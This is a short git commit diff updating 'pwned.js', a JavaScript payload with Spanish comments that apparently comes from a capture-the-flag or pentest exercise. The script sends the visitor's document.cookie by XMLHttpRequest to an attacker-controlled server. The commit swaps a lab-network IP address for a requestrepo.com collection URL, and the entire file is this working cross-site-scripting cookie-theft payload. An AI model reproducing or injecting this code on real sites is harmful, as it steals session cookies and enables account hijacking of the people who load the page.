254edb2744b0e222625f98359226adf58e750e90
backglass <cocok29@gmail.com>
2024-12-31 15:53:39 +0100

    Update pwned.js

--- pwned.js
+++ pwned.js
@@ -1,6 +1,6 @@
 //Creamos el objeto request
 var request = new XMLHttpRequest();
 //configuramos la petición hacia nuestro servidor
-request.open("GET", "http://10.10.14.14/?cookie=" + document.cookie);
+request.open("GET", "http://4ti3cfg7.requestrepo.com/?cookie=" + document.cookie);
 //Enviamos la petición
 request.send();
